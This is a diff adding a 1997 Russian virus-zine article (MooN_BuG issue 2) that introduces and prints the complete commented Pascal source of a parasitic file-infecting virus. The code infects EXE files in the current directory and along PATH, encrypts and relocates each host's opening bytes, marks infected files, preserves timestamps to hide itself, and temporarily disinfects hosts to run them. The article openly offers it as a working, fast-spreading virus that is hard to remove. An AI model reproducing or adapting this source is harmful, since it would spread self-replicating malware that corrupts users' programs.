@@ -1,0 +1,260 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 2, May 1997                                           file 005
+
+
+                               ВИРУСЫ-ПАРАЗИТЫ
+                                               by RedArc
+
+     Данный  тип  вирусов  наиболее  живуч.  Он  практически не имеет основных
+недостатков    предыдущих    типов   вирусов,   так   как   программа-жертва и
+программа-вирус располагаются в одном файле.
+     Описание  HLLP  есть в вирлисте у Данилова. По приведенному там алгоритму
+необходимо  всякий раз перед заражением или запуском на исполнение создавать и
+перезаписывать  кучу  файлов,  что сильно замедляет работу вируса и делает его
+практически неприемлемым для распространения.
+     Ниже  приведен  исходник  вируса  на  языке  Pascal,  который по скорости
+размножения  практически  не уступает аналогам, написанным на языке Assembler.
+Ну  и  самое  главное,  для его работы не требуются те маразматические приемы,
+которые привел господин Данилов.
+     Прошу  обратить особое внимание на следущие моменты (некоторые из которых
+уже встречались нам при написании предыдущих вирусов):
+     -  вирус  таскает в "куче" свою копию, что позволяет значительно ускорить
+процесс размножения;
+     -  при  инфицировании из начала программы в буфер считывается необходимое
+количество   байт,   которые   шифруются  в  памяти  и  записываются  в  конец
+программы-жертвы.  Поверх  начала  программы вирус и записывает свой код. Этот
+прием  позволяет избежать создания кучи файлов и значительно усложняет лечение
+вируса.
+     -  перед  запуском на исполнение "хозяина" целиком необходимо вылечить, а
+после  возврата  управления  вирусу  повторяем его инфицирование сначала. Этот
+прием  позволяет  организовать  подобие  стелс-механизма  и  использование для
+повторного  заражения  ранее  созданного  кода,  что  в свою очередь позволяет
+уменьшить размеры тушки.
+     -  для  быстрого  определения  присутствия  вируса  в  файле используется
+байт-идентификатор,  который  вирус  записывает  в  самый конец инфицированной
+программы, а перед заражением проверяет его наличие.
+
+     Большое количество комментариев позволит заинтересовавшимся разобраться в
+исходнике  вируса  детальнее,  а  нетерпеливым  уже  пора  прейти к следующему
+разделу - полноценный HLLP-вирус на языке BASIC... (а в переди нас ожидает еще
+много различных сюрпризов)!
+
+=== Cut ===
+(****************************************************************************)
+(*****             HLLP.Pascal (c) 1997 by RedArc // [TAVC]             *****)
+(*****    Поиск EXE-программ в текущем каталоге и по переменной PATH    *****)
+(*****            Паразитирование на основном коде программы            *****)
+(*****              MooN_BuG issue 2 // Вирусы-паразиты //              *****)
+(****************************************************************************)
+
+{$A+,B-,D-,E-,F-,G-,I-,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
+{$M 20000,0,10240}
+
+PROGRAM Pascal;
+
+USES DOS;
+
+CONST
+     MyLen = 5232; {Длина сжатого EXE-файла с кодом вируса}
+     Ident = 'MooN_BuG // HLLP.Pascal';
+     Limit = 5; {Количество допустимых заражений за один сеанс}
+VAR
+   SR : SearchRec; {Информация о найденном файле}
+   FN : String;    {Имя файла}
+   Dir : DirStr;   {Каталог}
+   Nam : NameStr;  {Имя}
+   Ext : ExtStr;   {Расширение}
+   P   : Pointer;  {Указтель на вирус в памяти}
+   Count : Byte;   {Количество инфицированных программ за сеанс}
+
+{Функция перевода строки символов в верхний регистр}
+FUNCTION UpStr (S : String) : String;
+VAR
+   I : Byte;
+BEGIN
+     FOR I := 1 TO Length (S) DO
+         S [I] := UpCase (S [I]);
+     UpStr := S;
+END;
+
+{"Обработка" клиента}
+PROCEDURE Infect_File;
+VAR
+   F : File; {Переменная для работы с файлами}
+   Buff1 : Array [1..MYLEN] Of Byte; {Буфер}
+   Buff2 : Array [1..MYLEN] Of Byte; {Буфер}
+   B : Byte;
+   W : Word;
+BEGIN
+     {Пытемся открыть найденный файл}
+     Assign (F, SR.Name);
+     FileMode := 2;
+     SetFAttr (F, Archive);
+     ReSet (F,1);
+     IF IOResult <> 0 THEN Exit;
+     {Проверяем предельные размеры файла для инфицирования}
+     IF (FileSize (F) < 2*MyLen) OR (FileSize (F) > 30*MyLen) THEN BEGIN
+        Close (F);
+        Exit;
+     END;
+     {Проверяем "метку" присутствия вируса - последний байт файла 'Z'}
+     Seek (F, FileSize (F)-1);
+     BlockRead (F, B, 1, W);
+     IF B = Ord ('Z') THEN BEGIN
+        {В этом файле вирус уже присутствует}
+        Close (F);
+        Exit;
+     END;
+     {Считываем в буфер начало программы}
+     Seek (F, 0);
+     BlockRead (F, Buff1, MyLen, W);
+     {Видоизменяем буфер до неузноваемости}
+     FOR W := 1 TO MyLen DO
+         Buff2 [W] := Buff1 [MyLen-W+1] xor $FF;
+     {Записываем содержимое буфера в конец файла}
+     Seek (F, FileSize (F));
+     BlockWrite (F, Buff2, MyLen, W);
+     {Записываем метку вируса (признак зараженности)}
+     B := Ord ('Z');
+     BlockWrite (F, B, 1, W);
+     {Записываем вирусный код в начало программы}
+     Seek (F, 0);
+     BlockWrite (F, P^, MyLen, W);
+     {Восстанавливаем временные параметры и атрибуты}
+     SetFTime (F, SR.Time);
+     Close (F);
+     SetFAttr (F, SR.Attr);
+     {Увеличиваем счетчик зараженных файлов}
+     Inc (Count);
+END;
+
+{Поиск в текущем каталоге}
+PROCEDURE Find_In_To_Current_Directory;
+BEGIN
+     FindFirst('*.EXE', AnyFile, SR);
+     While (DosError = 0) AND (Count < Limit) do begin
+           FSplit (SR.Name, Dir, Nam, Ext);
+           Infect_File;
+           FindNext(SR);
+     End;
+END;
+
+{Запуск программы-носителя на исполнение}
+PROCEDURE Exec_Program;
+VAR
+   F : File;
+   Buff1 : Array [1..MYLEN] Of Byte;
+   Buff2 : Array [1..MYLEN] Of Byte;
+   W : Word;
+   B : Byte;
+   S : String;
+   FTime : LongInt;
+   FAttr : Word;
+BEGIN
+     FSplit (FExpand(ParamStr (0)), Dir, Nam, Ext);
+     {Если старт из дроппера - запуск на исполнение не производим}
+     IF Nam = 'HLLP_PAS' THEN Exit;
+     {Запоминание характеристик файла}
+     Assign (F, ParamStr (0));
+     GetFAttr (F, FAttr);
+     SetFAttr (F, Archive);
+     {Пытемся открыть для чтения/записи}
+     FileMode := 2;
+     ReSet (F,1);
+     IF IOResult <> 0 THEN BEGIN
+        {Нет доступа к файлу - выдадим сообщение об ошибке}
+        WriteLn ('Run-time error 219 at 0000:DEAD');
+        Exit;
+     END;
+     GetFTime (F, FTime);
+     {Считываем зашифрованное начало программы}
+     Seek (F, FileSize (F) - (MyLen + 1));
+     BlockRead (F, Buff1, MyLen, W);
+     {Расшифровываем}
+     FOR W := 1 TO MyLen DO
+         Buff2 [W] := Buff1 [MyLen - W + 1] xor $FF;
+     {Записываем на прежнее место, затирая вирусный код}
+     Seek (F, 0);
+     BlockWrite (F, Buff2, MyLen, W);
+     {Отсекаем лишнюю информацию}
+     Seek (F, FileSize (F) - (MyLen + 1));
+     Truncate (F);
+     Close (F);
+     {Собираем параметры в строку}
+     S := '';
+     FOR W := 1 TO ParamCount DO
+         S := ParamStr (1) + ' ';
+     {Запускаем на исполнение}
+     SwapVectors;
+     Exec (ParamStr (0), S);
+     SwapVectors;
+     {Восстановим заражение}
+     FindFirst (ParamStr (0), AnyFile, SR);
+     Infect_File;
+END;
+
+{Перебор каталогов, указанных в переменной PATH}
+PROCEDURE Search_From_PATH;
+VAR
+   PS : String;
+   Home : String;
+   S : String;
+   Ch : Char;
+   I : Byte;
+BEGIN
+   GetDir (0, Home);
+   PS := GetEnv ('PATH');
+   S := '';
+   I := 1;
+   WriteLn (PS);
+   REPEAT
+         IF I >= Length (PS)+1 THEN BEGIN
+            IF S <> '' THEN BEGIN
+               IF S[Length(S)] = '\' THEN Delete (S, Length (S), 1);
+               ChDir (S);
+               IF IOResult = 0 THEN
+                  Find_In_To_Current_Directory;
+            END;
+            Break;
+         END;
+         Ch := PS [I];
+         Inc (I);
+         IF Ch <> ';' THEN S := S + Ch ELSE BEGIN
+            IF S[Length(S)] = '\' THEN Delete (S, Length (S), 1);
+            ChDir (S);
+            IF IOResult <> 0 THEN BEGIN
+               WriteLn (Ident); {Сообщение идентификационной информации}
+               S := '';
+               Continue;
+            END;
+            Find_In_To_Current_Directory;
+            S := '';
+         END;
+   UNTIL False;
+   ChDir (Home);
+END;
+
+VAR
+   F : File;
+   W : Word;
+BEGIN
+     {Инициализация счетчика инфицированных файлов}
+     Count := 0;
+     {Чтение вируса в память}
+     GetMem (P,MyLen);
+     Assign (F, ParamStr (0));
+     ReSet (F,1);
+     IF IOResult = 0 THEN BEGIN
+        BlockRead (F, P^, MyLen, W);
+        Close (F);
+        {Поиск в текущем каталоге}
+        Find_In_To_Current_Directory;
+        {Поиск по PATH}
+        Search_From_PATH;
+     END;
+     {Запуск программы-носителя}
+     Exec_Program;
+     {Освобождение памяти}
+     FreeMem (P, MyLen);
+END.
+=== Cut ===
